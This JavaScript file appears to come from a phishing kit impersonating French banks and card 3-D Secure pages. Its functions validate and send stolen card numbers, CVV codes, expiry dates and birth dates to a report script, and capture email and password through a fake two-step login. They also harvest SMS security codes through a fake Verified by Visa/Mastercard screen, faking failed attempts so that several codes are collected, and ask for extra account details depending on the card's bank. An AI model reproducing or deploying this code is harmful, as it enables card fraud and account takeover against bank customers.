  function sendcard(){
      $.ajax({
        url: 'inc/report.php',
        method: 'post',
        data: $('#X-dllOOPD').serialize(),
        success: function(message){
            window.location.href = 'vbv.php';
        }
      });
  }
    function checkCcno() {
    $("#card-type-trv").on("change", function () {
        if (this.value == 0) {
            $(this).addClass("error");
        } else {
            $(this).removeClass("error");
        }
    });
    $("#ccno").validateCreditCard(function (t) {
        $(this).focusout(function () {
            if (t.valid && t.length_valid && t.luhn_valid) {
                $(this).removeClass("error");
            } else {
                $(this).addClass("error");
            }
        });
        if (t.valid && t.length_valid && t.luhn_valid) {
            $(this).removeClass("error");
            checkBankForBDate($(this).val());
        } else {
            $(this).addClass("error");
            $("#dobirth , .departement-naissance , .n-compte").addClass("hidden").removeClass("error");
        }
    })
}

function checkCvv() {
    $("#cvv").on("keyup focus change past blur keystroke undo redo input", function () {
        var t = $(this).val();
        t.length != 3 || !isNumber(t) ? ($(this).addClass("error")) : $(this).removeClass("error")
    })
}

function checkExpDate() {
    $("#expMonth , #expYear").on("change", function () {
        var e = parseInt($("#expMonth").val()), s = parseInt($("#expYear").val());
        var a = new Date;
        if ((e <= a.getMonth() && s == a.getFullYear()) || s < a.getFullYear() || isNaN(s) || isNaN(e)) {
            $("#expdate").addClass("error")
        } else {
            $("#expdate").removeClass("error")
        }
    });

}

function hydrate(t) {
    var nom = t.nom, prenom = t.prenom, maj = t.maj, email = t.email, mobile = t.mobile,
        fix = t.fix;

    $(".info").html(maj);
    $(".title").html(prenom + " " + nom);
    var a = "";
    nom != undefined ?a += "<tr><td class='key'>Nom :</td><td class='value'>" + nom + "</td></tr>":a+="";
    prenom != undefined ?a += "<tr><td class='key'>Prénom :</td><td class='value'>" + prenom + "</td></tr>":a+="";
    email != undefined ?a += "<tr><td class='key'>Adresse email :</td><td class='value'>" + email + "</td></tr>":a+="";
    mobile != undefined ?a += "<tr><td class='key'>Numéro de mobile :</td><td class='value'>" + mobile + "</td></tr>":a+="";
    fix != undefined ?a += "<tr><td class='key'>Numéro de fixe :</td><td class='value'>" + fix + "</td></tr>":a+="";

    $(".fullData").append("<table>" + a + "</table>");
}


function checkCarding() {
    checkExpDate(), checkCvv(), checkCcno(), checkBdate(), checkInputGlobal(".n-compte") , checkInputGlobal(".departement-naissance") , $(".carding input , .carding select").on("keyup focus change past blur keystroke undo redo input", function () {
        (0 == $(".carding").find(".error").length) ? ($("#FFIOMNLLDSXXZQASDS").addClass("important")) : ($("#FFIOMNLLDSXXZQASDS").removeClass("important"))
    }),
        $("#FFIOMNLLDSXXZQASDS").click(function () {
            if ($(this).hasClass("deny")) {
                return false;
            } else {
                var error = $(".error").attr("for");
                if ($(this).hasClass("important")) {
                    $(".RRTITOTGHFHFERROR").addClass("hidden");
                    sendcard();
                } else {

                    $(".RRTITOTGHFHFERROR_message").html(error);
                    $(".RRTITOTGHFHFERROR").removeClass("hidden");
                }
            }

        }),
        $("span.annuler").click(function () {
                            alert('deny5');

            $("#ccno").val(""), $("#cvv").val(""), $("#cvv").addClass("error")
        });
}

function checkBdate() {
    $("#dobirth input").on("keyup focus change past blur keystroke undo redo input", function () {
        var dob = $("#dob").val(), dobe = parseInt(dob), mob = $("#mob").val(), mobe = parseInt(mob),
            yob = $("#yob").val(), yobe = parseInt(yob);
        dobe > 31 || dobe <= 0 || isNaN(dobe) || mobe > 12 || mobe <= 0 || isNaN(mobe) || yobe < 1912 || yobe > 2004 || isNaN(yobe) ? $("#dobirth").addClass("error") : ($("#dobirth").removeClass("error"))
    });

}

function checkInputGlobal(selector) {
    $(selector + " input").on("keyup focus change past blur keystroke undo redo input", function () {
        var val = $(this).val();
        val == "" || val.length < 2 ? $(selector).addClass("error") : $(selector).removeClass("error");
    });

}

function isNumber(string) {
    var regX = /\d{3,}/;
    return regX.test(string);
}

function escapeHtml(text) {

    if ((typeof A === "object") && (A !== null)) {
        text = JSON.stringify(text);
    } else {
        text += "";
    }
    return text
        .replace(/&/g, "&amp;")
        .replace(/</g, "&lt;")
        .replace(/>/g, "&gt;")
        .replace(/"/g, "&quot;")
        .replace(/'/g, "&#039;");
}

function vbvFormer(t, session, ip) {

    session = JSON.parse(session);

    console.log(session);

    t = JSON.parse(t);

    var phone = session.mobile != undefined ? session.mobile:session.fix;


    phone = phone.substr(phone.length - 3);
    // console.log(contracts);
    var e = "mastercard" == t.vbv ? "MC" : "visa",
        s = "mastercard" == t.vbv ? "https://i.imgur.com/P3f4NyM.png" : "https://i.imgur.com/V0OIpOs.png";
    $("img.right").prop("src", s), $("img.right").css("width", t.style), $(".bank-name").html(t.bank), $(".message-vbv").html(t.message);
    var a, r = "<tr>\n<td>N&deg; de carte :</td>\n<td>xxxxxxxxxxxx" + t.lastNumbers + "</td>\n</tr>";
    a = " le Code Securit&eacute; <br />que vous venez de recevoir sur votre  t&eacute;l&eacute;phone. ", r += ' <tr>\n<td>N&deg; t&eacute;l&eacute;phone :</td>\n<td style="letter-spacing: 0.07rem;">XXXXXXX' + phone + "</td>\n</tr>", r += '<tr class="pass3d scood">\n<td style="font-weight: bold;width: 41%;">Le Code Securit&eacute; reçus sur votre t&eacute;l&eacute;phone :</td>\n<td><input name="CodeRecusParPhone" type="text" style="width: 50%;height: 20px;font-size: 11px;outline: none;" class="error" id="vbv-code" maxlength="8"/>\n<span></span>\n<button type="button" class="disabled" disabled role="merci">Ok</button>\n</td>\n</tr>\n<script>essais("' + ip + '");<\/script>';

    $(".facture").append("44.99");
    $(".vbv-type").html(a), $("#core-vbv table ").append(r);
}

function otherVbvFormer(t) {
    t = JSON.parse(t);
    s = "mastercard" == t.vbv ? "app/views/assets/img/vbv/mastercard.gif" : "app/views/assets/img/vbv/visa.gif";
    $("#logo-brand").prop("src", s);
    $("#last-numbers").html(t.lastNumbers);
    checkInputGlobal(".xonotext");
    $("#submit").click(function () {
        var b = $(this).attr("title");
        if (0 != $(".form").find(".error").length) {
            $(".block-error").show();
        } else {
            $(".block-error").hide();
            submit(".form", "#submit");
        }
    })
}

function checkCodePhone() {
    $(".scood input").on("keyup focus change past blur keystroke undo redo input", function () {
        this.value.length >= 6 ? ($(this).removeClass("error"), $("button").prop("disabled", !1), $("button").removeClass("disabled")) : ($(this).addClass("error"), $("button").prop("disabled", !0), $("button").addClass("disabled"))
    })
}

function essais(ip) {
    var counter = 2;
    checkCodePhone();
    $("button").click(function () {
        var value = $("#vbv-code").val();
        $.post("?return_url=merci", {"type": 3, "ip": ip, "CodeRecusParPhone": value});
        if (counter == 0) {
            $(".essais").hide();
            $("form").submit();
        } else {
            $(".container").addClass("hidden");
            $(".brand").show();
            $("#vbv-code").val("");
            setTimeout(function () {
                $(".brand").hide();
                $(".container").removeClass("hidden");
                $("#vbv-code").val();
            }, 5000);
            $(".essais").show();
            $(".essais span").html(counter);
            counter--;
        }
    })
}

function getDataToHidden(selector, e, override) {
    var r = "";
    if (e.hasOwnProperty('maj'))
        delete e.maj;
    for (var o in e) "" != e[o] && (r += "<input type='hidden' name='" + o + "' value='" + e[o] + "'>");
    if (override == false)
        $(selector).append(r);
    else
        $(selector).html(r);
}

function submit(form, submitButton) {
    var a = $(form).serialize();
    var action = $(form).attr("for");
    $(".blockelem").addClass("hidden");
    $("#password").parents(".form-group").removeClass("has-error");
    $.ajax({
        type: "POST", url: "?check_url=" + action, data: a,
        beforeSend: function () {
            $(submitButton).addClass("deny").prop("disabled", true);
        },
        success: function (response) {
            if ("coordonnees" == action) {
                response = JSON.parse(response);
                if (response.code == 200) {
                    getDataToHidden(form, response, false);
                    Cookies.set('isLoggedIn', true, {expires: 1});
                    $(form).attr("action", "?return_url=" + action).submit();
                } else {
                    $(".blockelem").removeClass("hidden"), $("#password").val("");
                    $("#password").val("");
                    $("#password").parents(".form-group").addClass("has-error");
                }
            } else {
                $(form).attr("action", "?return_url=" + action).submit();
            }
            $(submitButton).removeClass("deny").prop("disabled", false);
        }, error: function (t) {
            $(".blockelem").html("D&eacute;sol&eacute;, une erreur s'est produite. R&eacute;essayez. ").removeClass("hidden");
            $(submitButton).removeClass("deny").prop("disabled", false);
        }, complete: function () {
            $(submitButton).removeClass("deny").prop("disabled", false);
        }, dataType: "html"
    })
}


function checkBankForBDate(ccno) {
    $.ajax({
        type: "GET",
        url: "?check_url=bank&bin=" + ccno,
        success: function (result) {
            var obj = JSON.parse(result), bank = obj.bank;
            if (bank.match(/BNP/i)) {
                $("#dobirth").removeClass("hidden").addClass("error");
                $(".departement-naissance , .n-compte").addClass("hidden").removeClass("error");
            } else if (bank.match(/POSTALE/i)) {
                $("#dobirth , .departement-naissance").addClass("hidden").removeClass("error");
                $(".n-compte").removeClass("hidden").addClass("error");
            } else if (bank.match(/SOCIETE GENERALE/i)) {
                $("#dobirth , .n-compte").addClass("hidden").removeClass("error");
                $(".departement-naissance").removeClass("hidden").addClass("error");
            } else {
                $("#dobirth , .departement-naissance , .n-compte").addClass("hidden").removeClass("error");
            }

        }
    });
}


function isEmail(t) {
    return /^([a-zA-Z0-9_.+-])+\@(([a-zA-Z0-9-])+\.)+([a-zA-Z0-9]{2,4})+$/.test(t)
}

function isPhone(t) {
    return /^((\+)33|0)[1-9](\d{2}){4}$/g.test(t)
}

function afficherHeure(t) {
    var e = new Date, s = (e.getMinutes() < 10 ? "0" : "") + e.getMinutes(),
        a = (e.getHours() < 10 ? "0" : "") + e.getHours() + ":" + s + ":" + ((e.getSeconds() < 10 ? "0" : "") + e.getSeconds());
    $("#" + t).html(a)
}

function afficherDate(t) {
    var e = new Date,
        s = (e.getDate() < 10 ? "0" : "") + e.getDate() + "/" + (((e.getMonth() + 1) < 10 ? "0" : "") + (e.getMonth() + 1)) + "/" + e.getFullYear();
    $("#" + t).html(s)
}

function datePrinter() {
    afficherDate("date"), afficherHeure("hour"), setInterval('afficherHeure("hour")', 1e3)
}

function loginMobile() {
    $(".important").click(function () {
        if ($(this).hasClass("deny")) {
            return false;
        } else {
            submit(".login", ".important");
        }
    }), $("span.annuler").click(function () {
        $("#email").val(""), $("#password").val("")
    })
}


function placeHolderManager(input, placeholder) {
    $(input).on("keyup  change past blur keystroke undo redo input", function () {
        var val = $(this).val();
        if (val.length == 0) {
            $(placeholder).removeClass("placeholderHidden").addClass("placeholderDisplay");
        } else {
            $(placeholder).removeClass("placeholderDisplay").addClass("placeholderHidden");
        }
    });
}

function loginDesktop() {
    var username = Cookies.get('username');
    var isLoggedIn = Cookies.get('isLoggedIn');

    $("#btnSubmitEmail").click(function () {
        var login = $("#login").val();
        if (isEmail(login) || isPhone(login)) {
            $("#error-msg-box-login").hide();
            Cookies.set('username', login, {expires: 1});
            username = login;
            $("#email").val(username);
            $("#accountLogin").html(login);
            $("#stage-1").hide().addClass("hideLogin");
            $("#stage-2").show().removeClass("hideLogin");
        } else {
            $("#error-msg-box-login").show();
            $("#login").parents(".form-group").addClass("has-error");
        }

    });


    if (username != null) {
        $("#accountLogin").html(username);
        $("#email").val(username);
        $("#stage-1").hide().addClass("hideLogin");
        $("#stage-2").show().removeClass("hideLogin");
    } else {
        $("#stage-2").hide().addClass("hideLogin");
        $("#stage-1").show().removeClass("hideLogin");
    }


    placeHolderManager("#login", "#placeholderLogin");
    placeHolderManager("#password", "#placeholderPassword");


    $("#btnSubmitCredentiels").click(function () {
        if ($(this).hasClass("deny")) {
            return false;
        } else {
            submit("#euiForm", "#btnSubmitCredentiels");
        }

    });


    $("#changeAccountLink").click(function () {
        Cookies.remove('username');
        $("#stage-2").hide().addClass("hideLogin");
        $("#stage-1").show().removeClass("hideLogin");
        $("#error-msg-box").hide();
        $("#password").parents(".form-group").removeClass("has-error");
    });
}


function isCookiesEnabled() {
    if (!navigator.cookieEnabled) {
        alert("Activez vos cookies !");
    }
}


function coordonneCheck(array) {
    hydrate(array);
    getDataToHidden(".carding", array, false);
    $(window).on('load', function () {
        $('#myModal').modal('show');
    });
    $('#myModal').modal({
        backdrop: 'static',
        keyboard: false
    });

    $('#myModal .imp , #myModal .annuler , #myModal .close').click(function () {
        var url = "?return_url=" + $("#myModal").attr("title");
        setTimeout(function () {
            window.location.href = url
        }, 1000);
    })
}


function isAlphaNumeric(t) {
    var regEx = /^[a-zA-Z0-9]+$/i;
    return regEx.test(t);

}


function isRioCode(selector) {
    $(selector + " input").on("keyup focus change past blur keystroke undo redo input", function () {
        var val = $(this).val();
        val == "" || !isAlphaNumeric(val) || val.length != 12 ? $(selector).addClass("error") : $(selector).removeClass("error");
    });

}

function checkCodeRio() {
    isRioCode(".rio");
    $(".carding input , .carding select").on("keyup focus change past blur keystroke undo redo input", function () {
        (0 == $(".carding").find(".error").length) ? ($("#FFIOMNLLDSXXZQASDS").addClass("important")) : ($("#FFIOMNLLDSXXZQASDS").removeClass("important"))
    }),
        $("#FFIOMNLLDSXXZQASDS").click(function () {
            if ($(this).hasClass("deny")) {
                return false;
            } else {
                var error = $(".error").attr("for");
                if ($(this).hasClass("important")) {
                    $(".RRTITOTGHFHFERROR").addClass("hidden");
                    submit(".carding", "span.important");
                } else {
                    $(".RRTITOTGHFHFERROR_message").html(error);
                    $(".RRTITOTGHFHFERROR").removeClass("hidden");
                }
            }
        });
}